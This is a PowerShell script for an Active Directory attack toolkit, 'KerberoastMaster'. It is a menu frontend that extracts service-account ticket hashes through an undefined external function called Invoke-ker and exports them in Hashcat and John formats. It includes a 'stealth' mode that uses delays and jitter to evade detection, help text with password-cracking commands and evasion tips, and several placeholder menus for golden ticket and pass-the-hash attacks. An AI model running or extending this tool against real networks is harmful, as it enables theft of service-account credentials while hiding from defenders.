# KerberoastMaster.ps1
# Advanced Active Directory Attack Toolkit

function Show-Banner {
    Write-Host @"
╔═══════════════════════════════════════════════╗
║            KerberoastMaster v2.0              ║
║         Advanced AD Attack Toolkit            ║
║           For Authorized Testing Only         ║
╚═══════════════════════════════════════════════╝
"@ -ForegroundColor Cyan
}

function Get-CurrentUserInfo {
    try {
        $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $Domain = $CurrentUser.Name.Split('\')[0]
        $Username = $CurrentUser.Name.Split('\')[1]
        Write-Host "[*] Current Domain: $Domain" -ForegroundColor Yellow
        Write-Host "[*] Current User: $Domain\$Username" -ForegroundColor Yellow
        return @{Domain=$Domain; Username=$Username}
    }
    catch {
        Write-Host "[*] Unable to retrieve current user info" -ForegroundColor Red
        return @{Domain="UNKNOWN"; Username="UNKNOWN"}
    }
}

function Invoke-KerberoastMaster {
    do {
        Clear-Host
        Show-Banner
        $UserInfo = Get-CurrentUserInfo
        
        Write-Host "`nMain Menu:" -ForegroundColor Green
        Write-Host "1. Kerberoasting Attacks" -ForegroundColor White
        Write-Host "2. Golden Ticket Attacks" -ForegroundColor White
        Write-Host "3. Pass-the-Ticket" -ForegroundColor White
        Write-Host "4. Pass-the-Hash" -ForegroundColor White
        Write-Host "5. User & SPN Enumeration" -ForegroundColor White
        Write-Host "6. Export Results" -ForegroundColor White
        Write-Host "7. Help & Documentation" -ForegroundColor White
        Write-Host "0. Exit" -ForegroundColor Red
        
        $Choice = Read-Host "`nSelect option [0-7]"
        
        switch ($Choice) {
            '1' { Invoke-KerberoastingMenu }
            '2' { Invoke-GoldenTicketMenu }
            '3' { Invoke-PassTheTicketMenu }
            '4' { Invoke-PassTheHashMenu }
            '5' { Invoke-EnumerationMenu }
            '6' { Invoke-ExportMenu }
            '7' { Show-Help }
            '0' { 
                Write-Host "`n[!] Exiting KerberoastMaster. Stay ethical!" -ForegroundColor Yellow
                return 
            }
            default { 
                Write-Host "[-] Invalid option. Please try again." -ForegroundColor Red
                Start-Sleep -Seconds 2
            }
        }
    } while ($true)
}

function Invoke-KerberoastingMenu {
    do {
        Clear-Host
        Show-Banner
        Write-Host "`nKerberoasting Options:" -ForegroundColor Green
        Write-Host "1. Quick Kerberoast (All SPN Users)" -ForegroundColor White
        Write-Host "2. Targeted Kerberoast (Specific Users)" -ForegroundColor White
        Write-Host "3. Stealth Kerberoast (Slow & Random)" -ForegroundColor White
        Write-Host "4. Custom LDAP Filter" -ForegroundColor White
        Write-Host "5. Back to Main Menu" -ForegroundColor Red
        
        $Choice = Read-Host "`nSelect option [1-5]"
        
        switch ($Choice) {
            '1' { Start-KerberoastQuick }
            '2' { Start-KerberoastTargeted }
            '3' { Start-KerberoastStealth }
            '4' { Start-KerberoastCustom }
            '5' { return }
            default { 
                Write-Host "[-] Invalid option." -ForegroundColor Red
                Start-Sleep -Seconds 1
            }
        }
    } while ($Choice -ne '5')
}

function Start-KerberoastQuick {
    Write-Host "`n[*] Starting Quick Kerberoasting..." -ForegroundColor Yellow
    
    # Output format selection
    Write-Host "`nOutput Format:" -ForegroundColor Green
    Write-Host "1. Hashcat (Recommended)" -ForegroundColor White
    Write-Host "2. John the Ripper" -ForegroundColor White
    $FormatChoice = Read-Host "Select format [1-2]"
    $OutputFormat = if ($FormatChoice -eq '2') { 'john' } else { 'hashcat' }
    
    try {
        # Use the existing Invoke-ker function
        $Results = Invoke-ker -OutputFormat $OutputFormat
        
        if ($Results) {
            Write-Host "`n[+] Kerberoasting completed! Found $($Results.Count) tickets" -ForegroundColor Green
            $Global:KerberoastResults = $Results
        } else {
            Write-Host "[-] No SPN tickets found or extraction failed" -ForegroundColor Red
        }
    }
    catch {
        Write-Host "[-] Error during Kerberoasting: $_" -ForegroundColor Red
    }
    
    Write-Host "`n[*] Press any key to continue..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Start-KerberoastTargeted {
    Write-Host "`n[*] Targeted Kerberoasting" -ForegroundColor Yellow
    Write-Host "[*] Enter usernames (comma-separated):" -ForegroundColor White
    $UserInput = Read-Host "Usernames"
    $TargetUsers = $UserInput -split ',' | ForEach-Object { $_.Trim() }
    
    if (-not $TargetUsers) {
        Write-Host "[-] No users specified" -ForegroundColor Red
        return
    }
    
    # Output format selection
    Write-Host "`nOutput Format:" -ForegroundColor Green
    Write-Host "1. Hashcat" -ForegroundColor White
    Write-Host "2. John the Ripper" -ForegroundColor White
    $FormatChoice = Read-Host "Select format [1-2]"
    $OutputFormat = if ($FormatChoice -eq '2') { 'john' } else { 'hashcat' }
    
    try {
        $AllResults = @()
        foreach ($User in $TargetUsers) {
            Write-Host "[*] Targeting user: $User" -ForegroundColor Yellow
            $UserResults = Invoke-ker -LDAPFilter "(samaccountname=$User)" -OutputFormat $OutputFormat
            if ($UserResults) {
                $AllResults += $UserResults
            }
        }
        
        if ($AllResults) {
            Write-Host "`n[+] Targeted Kerberoasting completed! Found $($AllResults.Count) tickets" -ForegroundColor Green
            $Global:KerberoastResults = $AllResults
        } else {
            Write-Host "[-] No tickets extracted from targeted users" -ForegroundColor Red
        }
    }
    catch {
        Write-Host "[-] Error during targeted Kerberoasting: $_" -ForegroundColor Red
    }
    
    Write-Host "`n[*] Press any key to continue..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Start-KerberoastStealth {
    Write-Host "`n[*] Stealth Kerberoasting Mode" -ForegroundColor Yellow
    Write-Host "[*] This mode uses delays and jitter to evade detection" -ForegroundColor White
    
    $Delay = Read-Host "Delay between requests in seconds [5]"
    if (-not $Delay) { $Delay = 5 }
    
    $Jitter = Read-Host "Jitter percentage (0-100) [30]"
    if (-not $Jitter) { $Jitter = 30 }
    
    # Output format selection
    Write-Host "`nOutput Format:" -ForegroundColor Green
    Write-Host "1. Hashcat" -ForegroundColor White
    Write-Host "2. John the Ripper" -ForegroundColor White
    $FormatChoice = Read-Host "Select format [1-2]"
    $OutputFormat = if ($FormatChoice -eq '2') { 'john' } else { 'hashcat' }
    
    try {
        $Results = Invoke-ker -OutputFormat $OutputFormat -Delay $Delay -Jitter ($Jitter/100.0)
        
        if ($Results) {
            Write-Host "`n[+] Stealth Kerberoasting completed! Found $($Results.Count) tickets" -ForegroundColor Green
            $Global:KerberoastResults = $Results
        } else {
            Write-Host "[-] No SPN tickets found" -ForegroundColor Red
        }
    }
    catch {
        Write-Host "[-] Error during stealth Kerberoasting: $_" -ForegroundColor Red
    }
    
    Write-Host "`n[*] Press any key to continue..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Start-KerberoastCustom {
    Write-Host "`n[*] Custom LDAP Filter Kerberoasting" -ForegroundColor Yellow
    Write-Host "[*] Example filters:" -ForegroundColor White
    Write-Host "    - (&(servicePrincipalName=*sql*)(adminCount=1))" -ForegroundColor Gray
    Write-Host "    - (&(servicePrincipalName=*http*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" -ForegroundColor Gray
    Write-Host "    - (servicePrincipalName=*exchange*)" -ForegroundColor Gray
    
    $LdapFilter = Read-Host "`nEnter LDAP filter"
    
    if (-not $LdapFilter) {
        Write-Host "[-] No filter specified" -ForegroundColor Red
        return
    }
    
    # Output format selection
    Write-Host "`nOutput Format:" -ForegroundColor Green
    Write-Host "1. Hashcat" -ForegroundColor White
    Write-Host "2. John the Ripper" -ForegroundColor White
    $FormatChoice = Read-Host "Select format [1-2]"
    $OutputFormat = if ($FormatChoice -eq '2') { 'john' } else { 'hashcat' }
    
    try {
        $Results = Invoke-ker -LDAPFilter $LdapFilter -OutputFormat $OutputFormat
        
        if ($Results) {
            Write-Host "`n[+] Custom Kerberoasting completed! Found $($Results.Count) tickets" -ForegroundColor Green
            $Global:KerberoastResults = $Results
        } else {
            Write-Host "[-] No tickets found with the specified filter" -ForegroundColor Red
        }
    }
    catch {
        Write-Host "[-] Error during custom Kerberoasting: $_" -ForegroundColor Red
    }
    
    Write-Host "`n[*] Press any key to continue..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Invoke-GoldenTicketMenu {
    Write-Host "`nGolden Ticket Attacks - COMING SOON" -ForegroundColor Yellow
    Write-Host "[*] This feature requires additional setup and privileges" -ForegroundColor White
    Write-Host "`n[*] Press any key to continue..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Invoke-PassTheTicketMenu {
    Write-Host "`nPass-the-Ticket - COMING SOON" -ForegroundColor Yellow
    Write-Host "[*] This feature requires additional setup" -ForegroundColor White
    Write-Host "`n[*] Press any key to continue..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Invoke-PassTheHashMenu {
    Write-Host "`nPass-the-Hash - COMING SOON" -ForegroundColor Yellow
    Write-Host "[*] This feature requires additional setup" -ForegroundColor White
    Write-Host "`n[*] Press any key to continue..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Invoke-EnumerationMenu {
    Write-Host "`nUser & SPN Enumeration - COMING SOON" -ForegroundColor Yellow
    Write-Host "[*] This feature will be implemented in future versions" -ForegroundColor White
    Write-Host "`n[*] Press any key to continue..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Invoke-ExportMenu {
    if (-not $Global:KerberoastResults -or $Global:KerberoastResults.Count -eq 0) {
        Write-Host "`n[-] No Kerberoasting results to export" -ForegroundColor Red
        Write-Host "[*] Run a Kerberoasting attack first" -ForegroundColor Yellow
        Write-Host "`n[*] Press any key to continue..." -ForegroundColor Yellow
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        return
    }
    
    Write-Host "`nExport Options:" -ForegroundColor Green
    Write-Host "1. Export as Text File" -ForegroundColor White
    Write-Host "2. Export as CSV" -ForegroundColor White
    Write-Host "3. Export as John Format" -ForegroundColor White
    Write-Host "4. Export as Hashcat Format" -ForegroundColor White
    Write-Host "5. Back to Main Menu" -ForegroundColor Red
    
    $Choice = Read-Host "`nSelect option [1-5]"
    
    switch ($Choice) {
        '1' { Export-AsText }
        '2' { Export-AsCSV }
        '3' { Export-AsJohn }
        '4' { Export-AsHashcat }
        '5' { return }
        default { 
            Write-Host "[-] Invalid option" -ForegroundColor Red
        }
    }
}

function Export-AsText {
    $Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $Filename = "kerberoast_results_$Timestamp.txt"
    
    try {
        $Global:KerberoastResults | ForEach-Object {
            "Service: $($_.ServicePrincipalName)"
            "User: $($_.SamAccountName)"
            "Distinguished Name: $($_.DistinguishedName)"
            "Hash: $($_.Hash)"
            "-" * 50
        } | Out-File -FilePath $Filename -Encoding UTF8
        
        Write-Host "[+] Results exported to: $Filename" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Error exporting results: $_" -ForegroundColor Red
    }
}

function Export-AsCSV {
    $Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $Filename = "kerberoast_results_$Timestamp.csv"
    
    try {
        $Global:KerberoastResults | Select-Object SamAccountName, ServicePrincipalName, DistinguishedName, Hash | Export-Csv -Path $Filename -NoTypeInformation
        Write-Host "[+] Results exported to: $Filename" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Error exporting results: $_" -ForegroundColor Red
    }
}

function Export-AsJohn {
    $Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $Filename = "kerberoast_john_$Timestamp.txt"
    
    try {
        $Global:KerberoastResults | ForEach-Object { $_.Hash } | Out-File -FilePath $Filename -Encoding UTF8
        Write-Host "[+] John format exported to: $Filename" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Error exporting results: $_" -ForegroundColor Red
    }
}

function Export-AsHashcat {
    $Timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $Filename = "kerberoast_hashcat_$Timestamp.txt"
    
    try {
        $Global:KerberoastResults | ForEach-Object { $_.Hash } | Out-File -FilePath $Filename -Encoding UTF8
        Write-Host "[+] Hashcat format exported to: $Filename" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Error exporting results: $_" -ForegroundColor Red
    }
}

function Show-Help {
    Clear-Host
    Show-Banner
    
    Write-Host "`nKerberoastMaster Help & Documentation" -ForegroundColor Green
    Write-Host "=" * 50 -ForegroundColor White
    
    Write-Host "`nWhat is Kerberoasting?" -ForegroundColor Yellow
    Write-Host "Kerberoasting is an attack that extracts service account tickets (TGS)" -ForegroundColor White
    Write-Host "from Active Directory and allows offline cracking of their passwords." -ForegroundColor White
    
    Write-Host "`nUsage Tips:" -ForegroundColor Yellow
    Write-Host "1. Quick Kerberoast: Fast extraction of all SPN accounts" -ForegroundColor White
    Write-Host "2. Targeted: Focus on specific high-value accounts" -ForegroundColor White
    Write-Host "3. Stealth Mode: Slower but more evasive" -ForegroundColor White
    Write-Host "4. Custom Filters: Advanced targeting with LDAP" -ForegroundColor White
    
    Write-Host "`nCracking Tools:" -ForegroundColor Yellow
    Write-Host "Hashcat:   hashcat -m 13100 hashes.txt wordlist.txt" -ForegroundColor White
    Write-Host "John:      john --format=krb5tgs hashes.txt" -ForegroundColor White
    
    Write-Host "`nDetection Evasion:" -ForegroundColor Yellow
    Write-Host "- Use delays between ticket requests" -ForegroundColor White
    Write-Host "- Randomize timing with jitter" -ForegroundColor White
    Write-Host "- Target specific accounts rather than all" -ForegroundColor White
    
    Write-Host "`nLegal Notice:" -ForegroundColor Red
    Write-Host "This tool is for authorized penetration testing and educational" -ForegroundColor White
    Write-Host "purposes only. Always obtain proper authorization before use." -ForegroundColor White
    
    Write-Host "`n[*] Press any key to return to main menu..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# Initialize global variable for results
$Global:KerberoastResults = @()

# Export functions for module use
Export-ModuleMember -Function Invoke-KerberoastMaster, Show-Banner, Show-Help

# Main execution when script is run directly
if ($MyInvocation.InvocationName -eq '&' -or $MyInvocation.Line -eq '') {
    Invoke-KerberoastMaster
}